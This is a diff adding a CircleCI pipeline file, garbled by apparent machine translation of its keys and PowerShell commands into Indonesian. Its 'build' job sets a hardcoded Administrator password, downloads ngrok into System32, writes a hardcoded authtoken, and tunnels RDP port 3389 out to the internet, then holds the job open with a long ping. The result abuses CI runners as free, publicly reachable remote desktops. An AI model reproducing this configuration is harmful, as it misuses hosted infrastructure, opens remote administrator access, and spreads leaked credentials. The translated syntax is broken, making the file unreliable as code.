@@ -1,0 +1,22 @@
+versi: 2.1
+ 
+bola:
+  menang: circleci/ windows@2.2.0
+ 
+pekerjaan:
+  membangun:
+    pelaksana:
+      nama: menang/default
+      ukuran: "sedang"
+ 
+    Langkah:
+      - Periksa      
+      - jalankan: Set-LocalUser -Nama "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Akuhnet123" -Force)
+      - jalankan: Get-LocalUser -Nama "Administrator" | Aktifkan-Pengguna Lokal
+      - jalankan: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+      - jalankan: tar xf ngrok.zip
+      - jalankan: Salin ngrok.exe C:\Windows\System32
+      - jalankan: cmd /c echo ./ngrok.exe authtoken "25AaJqTPL5vFNoNwRWSDrhjZlml_3KKfBBTWAwF3xGQyqPKtY" >a.ps1
+      - jalankan: cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
+      - jalankan: cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+      - jalankan: .\a.ps1
